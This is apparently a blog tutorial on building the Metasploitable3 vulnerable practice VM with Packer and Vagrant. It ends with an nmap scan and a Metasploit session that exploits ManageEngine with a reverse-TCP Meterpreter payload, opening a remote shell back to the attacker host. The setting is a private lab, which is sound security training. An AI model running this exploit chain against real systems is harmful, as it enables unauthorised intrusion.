---
title: "Build a Metasploit Test Bench with Metasploitable3 & Vagrant"
excerpt: "How to install Metasploitable3 with Vagrant on macOS."
tags:
  - metasploit
  - metasploitable
  - exploit
  - vagrant
---

---
Metasploitable3 is a virtual machine that is built from the ground up with a large amount of security vulnerabilities. It is intended to be used as a target for testing exploits with metasploit.

It succeed to [Metasploitable2](https://community.rapid7.com/docs/DOC-1875), a pre-built ISO image also containing security vulnerabilities. The new version is fully built on Packer and Vagrant allowing you to customize it, especially by introducing different difficulty levels. Since the system is built on-demand, it allow someone to set a variable before the build and the resulting VM will have different services more open or locked down depending on what is selected.

## Install the Build Environment

To prepare the environment you need to install the following dependencies:

* [Homebrew](http://brew.sh)
* [Packer](https://www.packer.io)
* [Vagrant](https://www.vagrantup.com)
* [Vagrant Reload Plugin](https://github.com/aidanns/vagrant-reload)
* [VirtualBox](https://www.virtualbox.org/wiki/Downloads)
* Internet connection

**Note:** At the time of writing, the last release of VirtualBox (5.1.8) is breaking the provisioning process. You should use VirtualBox 5.1.6 or the last testing version. For more information, check this issue on GitHub: [https://github.com/rapid7/metasploitable3/issues/41](https://github.com/rapid7/metasploitable3/issues/41).
{: .notice--warning}

**Update:** It seems that the previous issues was fixed in VirtualBox (5.1.12).
{: .notice--info}

As I am running a macOS system, I used Brew to install the dependencies.

```bash
# Install Packer
$ brew install packer

# Install Vagrant
$ brew install vagrant

# Install Vagrant Reload Plugin
$ vagrant plugin install vagrant-reload
```


Then clone the [Metasploitable3](https://github.com/rapid7/metasploitable3) repository from GitHub.

```bash
$ git clone https://github.com/rapid7/metasploitable3.git
$ cd metasploitable3
```

## Build the Base VM Image

Once your environment is setup, build the base VM image by running Packer. This will take a while the first time you run it since it has to download the OS installation ISO.

```bash
$ packer build windows_2008_r2.json

virtualbox-iso output will be in this color.

==> virtualbox-iso: Downloading or copying Guest additions
    virtualbox-iso: Downloading or copying: file:///Applications/VirtualBox.app/Contents/MacOS/VBoxGuestAdditions.iso
==> virtualbox-iso: Downloading or copying ISO
    virtualbox-iso: Downloading or copying: http://download.microsoft.com/download/7/5/E/75EC4E54-5B02-42D6-8879-D8D3A25FBEF7/7601.17514.101119-1850_x64fre_server_eval_en-us-GRMSXEVAL_EN_DVD.iso
    virtualbox-iso: Download progress: 1%
    virtualbox-iso: Download progress: 3%
    virtualbox-iso: Download progress: 5%

[...]

==> virtualbox-iso: Unregistering and deleting virtual machine...
==> virtualbox-iso: Running post-processor: vagrant
==> virtualbox-iso (vagrant): Creating Vagrant box for 'virtualbox' provider
    virtualbox-iso (vagrant): Copying from artifact: output-virtualbox-iso/packer-virtualbox-iso-1478461854-disk1.vmdk
    virtualbox-iso (vagrant): Copying from artifact: output-virtualbox-iso/packer-virtualbox-iso-1478461854.ovf
    virtualbox-iso (vagrant): Renaming the OVF to box.ovf...
    virtualbox-iso (vagrant): Using custom Vagrantfile: vagrantfile-windows_2008_r2.template
    virtualbox-iso (vagrant): Compressing: Vagrantfile
    virtualbox-iso (vagrant): Compressing: box.ovf
    virtualbox-iso (vagrant): Compressing: metadata.json
    virtualbox-iso (vagrant): Compressing: packer-virtualbox-iso-1478461854-disk1.vmdk
Build 'virtualbox-iso' finished.
```

## Provisioning with Vagrant

After the base Vagrant box is created you need to add it to your Vagrant environment.

```bash
$ vagrant box add windows_2008_r2_virtualbox.box --name=metasploitable3
==> box: Box file was not detected as metadata. Adding it directly...
==> box: Adding box 'metasploitable3' (v0) for provider: 
    box: Unpacking necessary files from: file:///Users/ax/Downloads/metasploitable3/windows_2008_r2_virtualbox.box
==> box: Successfully added box 'metasploitable3' (v0) for 'virtualbox'!
```

Then, to start the provisioning process, run the command `vagrant up`. This will start up the VM and run all of the installation and configuration scripts necessary to set everything up. This takes about 20 minutes.

```bash
$ vagrant up
Bringing machine 'default' up with 'virtualbox' provider...
==> default: Importing base box 'metasploitable3'...
==> default: Matching MAC address for NAT networking...
==> default: Setting the name of the VM: metasploitable3_default_1478815443621_32649
==> default: Clearing any previously set network interfaces...
==> default: Preparing network interfaces based on configuration...
    default: Adapter 1: nat
    default: Adapter 2: hostonly
==> default: Forwarding ports...
    default: 3389 (guest) => 3389 (host) (adapter 1)
    default: 22 (guest) => 2222 (host) (adapter 1)
    default: 5985 (guest) => 55985 (host) (adapter 1)
    default: 5986 (guest) => 55986 (host) (adapter 1)

[...]

```

If the provisioning went well, the Metasploitable3 is ready to be used.

## Check the Virtual Machine

To start exploiting the various services, I suggest you to check the open port on the virtual machine by using **Nmap**.

```bash
$ nmap -sV -p- 172.28.128.3

Starting Nmap 7.30 ( https://nmap.org )
Nmap scan report for 172.28.128.3
Host is up (0.0030s latency).
Not shown: 65516 filtered ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
22/tcp    open  ssh           OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http          Microsoft IIS httpd 7.5
1617/tcp  open  nimrod-agent?
4848/tcp  open  ssl/http      Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8020/tcp  open  http          Apache httpd
8022/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
8027/tcp  open  unknown
8080/tcp  open  http          Oracle GlassFish 4.0 (Servlet 3.1; JSP 2.3; Java 1.8)
8282/tcp  open  http          Apache Tomcat/Coyote JSP engine 1.1
8383/tcp  open  ssl/http      Apache httpd
8484/tcp  open  http          Jetty winstone-2.8
8585/tcp  open  http          Apache httpd 2.2.21 ((Win64) PHP/5.3.10 DAV/2)
9200/tcp  open  http          Elasticsearch REST API 1.1.1 (name: Inertia; Lucene 4.7)
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49263/tcp open  unknown
49264/tcp open  tcpwrapped
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 257.28 seconds
```

As you can see, there are many services running on the VM. Let's try to get a root shell by exploiting one of them.

## Quick Exploit with Metasploit

I choose to exploit the ManageEngine server of the virtual machine by using the **exploit/windows/http/manageengine_connectionid_write** exploit module from Metasploit.

```bash
msf > use exploit/windows/http/manageengine_connectionid_write
msf exploit(manageengine_connectionid_write) > show options 

Module options (exploit/windows/http/manageengine_connectionid_write):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                       yes       The target address
   RPORT      8020             yes       The target port
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path for ManageEngine Desktop Central
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   ManageEngine Desktop Central 9 on Windows


msf exploit(manageengine_connectionid_write) > set RHOST 172.28.128.3
RHOST => 172.28.128.3
msf exploit(manageengine_connectionid_write) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(manageengine_connectionid_write) > set LHOST 172.28.128.4
LHOST => 172.28.128.4

msf exploit(manageengine_connectionid_write) > exploit 

[*] Started reverse TCP handler on 172.28.128.4:4444 
[*] Creating JSP stager
[*] Uploading JSP stager WJsoA.jsp...
[*] Executing stager...
[*] Sending stage (957999 bytes) to 172.28.128.3
[*] Meterpreter session 1 opened (172.28.128.4:4444 -> 172.28.128.3:49522)
[+] Deleted ../webapps/DesktopCentral/jspf/WJsoA.jsp

meterpreter > getuid 
Server username: NT AUTHORITY\LOCAL SERVICE
meterpreter > 
```

Yay ! We got a remote Meterpreter shell. Now it's your turn, have fun !


## Resources

* [Official Metasploitable3 Repository](https://github.com/rapid7/metasploitable3)
* [Metasploitable3 Wiki](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities)
* [VirtualBox (Old Builds)](https://www.virtualbox.org/wiki/Download_Old_Builds_5_1)
* [Packer.io](https://www.packer.io)
* [Vagrant](https://www.vagrantup.com)
* [Vagrant Reload Plugin](https://github.com/aidanns/vagrant-reload)
